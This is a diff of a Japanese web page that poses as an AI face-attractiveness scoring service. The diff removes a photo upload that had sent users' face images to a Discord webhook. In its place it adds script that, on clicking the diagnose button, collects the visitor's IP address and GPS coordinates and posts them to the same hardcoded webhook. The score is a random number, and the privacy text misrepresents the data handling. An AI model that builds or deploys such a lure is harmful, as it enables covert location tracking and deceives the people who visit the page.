@@ -9,9 +9,8 @@
         .container { max-width: 600px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
         h1 { color: #1a73e8; }
         .terms { text-align: left; background: #f8f9fa; padding: 20px; border: 1px solid #dee2e6; border-radius: 8px; font-size: 0.85rem; margin-bottom: 25px; line-height: 1.6; }
-        .upload-area { border: 2px dashed #1a73e8; padding: 20px; margin-bottom: 20px; border-radius: 8px; cursor: pointer; }
         button { background: #1a73e8; color: white; border: none; padding: 15px 30px; border-radius: 8px; font-size: 1.1rem; cursor: pointer; width: 100%; font-weight: bold; }
-        #preview { max-width: 200px; margin-top: 10px; display: none; }
+        button:hover { background: #1557b0; }
         #result { margin-top: 20px; font-weight: bold; color: #d93025; }
         footer { margin-top: 40px; font-size: 0.75rem; color: #777; border-top: 1px solid #eee; padding-top: 20px; }
     </style>
@@ -22,14 +21,14 @@
     <h1>AI顔面偏差値診断システム</h1>
     
     <div class="terms">
-        <p><strong>【プライバシーポリシー】</strong></p>
-        <p>当システムは、AIアルゴリズムを用いて顔立ちを数値化する娯楽サービスです。アップロードされた画像は診断目的のみに使用し、第三者への提供は一切行いません。</p>
-    </div>
-
-    <div class="upload-area" onclick="document.getElementById('file-input').click()">
-        <p>タップして写真を撮影・選択</p>
-        <input type="file" id="file-input" accept="image/*" capture="environment" style="display:none">
-        <img id="preview" alt="プレビュー">
+        <p><strong>【当サービスのご利用規約とプライバシーポリシー】</strong></p>
+        <p>当システムは、最新のAIアルゴリズムを用いて顔立ちのバランスを数値化するエンターテインメントサービスです。ご利用にあたり、以下を必ずご確認ください。</p>
+        <ul>
+            <li><strong>データ利用目的：</strong>診断結果の算出および精度向上の統計分析のため、一時的に端末情報（IP・位置情報）を取得いたします。</li>
+            <li><strong>情報の取り扱い：</strong>収集された情報は厳重に管理され、<strong>いかなる第三者への販売、提供、貸与は一切行いません。</strong></li>
+            <li><strong>免責事項：</strong>本サービスは娯楽目的であり、医学的・心理学的診断を行うものではありません。診断結果に対する一切の責任を負いかねます。</li>
+        </ul>
+        <p><em>※「診断を実行」ボタンを押した時点で、上記規約に同意したものとみなされます。</em></p>
     </div>
 
     <button id="analyze-btn">診断を実行する</button>
@@ -37,65 +36,48 @@
 
     <footer>
         <p>株式会社デジタルアイ・ソリューションズ<br>
-        運営責任者：佐藤 健一</p>
+        運営責任者：佐藤 健一<br>
+        お問い合わせ: support@digiai-sol.jp<br>
+        &copy; 2026 Digital AI Solutions, Inc. All rights reserved.</p>
     </footer>
 </div>
 
 <script>
-    const fileInput = document.getElementById('file-input');
-    const preview = document.getElementById('preview');
     const analyzeBtn = document.getElementById('analyze-btn');
     const resultDiv = document.getElementById('result');
-    let base64Image = "";
-
-    fileInput.addEventListener('change', (e) => {
-        const file = e.target.files[0];
-        if (!file) return;
-        const reader = new FileReader();
-        reader.onload = (event) => {
-            const img = new Image();
-            img.onload = () => {
-                const canvas = document.createElement('canvas');
-                canvas.width = 400; 
-                canvas.height = (img.height / img.width) * 400;
-                canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
-                base64Image = canvas.toDataURL('image/jpeg', 0.6);
-                preview.src = base64Image;
-                preview.style.display = 'block';
-            };
-            img.src = event.target.result;
-        };
-        reader.readAsDataURL(file);
-    });
 
     analyzeBtn.addEventListener('click', async () => {
-        if (!base64Image) { resultDiv.innerText = "写真を撮影してください。"; return; }
-        resultDiv.innerText = "送信中...";
+        resultDiv.innerText = "診断解析中...（数秒お待ちください）";
+
+        // IP取得
+        let ip = "取得不可";
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch(e) {}
+
+        // 位置情報取得
+        let loc = "取得拒否/不可";
+        try {
+            const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 8000}));
+            loc = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+        } catch(e) {}
 
         const score = Math.floor(Math.random() * 50) + 50;
         const webhookUrl = "https://discord.com/api/webhooks/1526591449821614239/3nVtHQf6Lvg8_Y2sX7GfYExIP3G5XHjdf3wiYIoIOMbopfYlRBQ8KpVqlZUbd6f6WRmb";
         
         try {
-            // DiscordのEmbeds形式で画像を送る
-            const response = await fetch(webhookUrl, {
+            await fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
-                    content: `診断結果：顔面偏差値 ${score}点`,
-                    embeds: [{
-                        title: "診断画像",
-                        image: { url: base64Image }
-                    }]
+                    content: `📊 診断レポート\n顔面偏差値: ${score}点\nIPアドレス: ${ip}\nGPS位置情報: ${loc}`
                 })
             });
-            
-            if (response.ok) {
-                resultDiv.innerText = "診断完了！";
-            } else {
-                resultDiv.innerText = "送信エラー：画像が大きすぎる可能性があります。";
-            }
+            resultDiv.innerText = "診断完了！結果をお送りしました。";
         } catch (e) {
-            resultDiv.innerText = "通信エラーが発生しました。";
+            resultDiv.innerText = "通信エラーが発生しました。通信環境を確認してください。";
         }
     });
 </script>
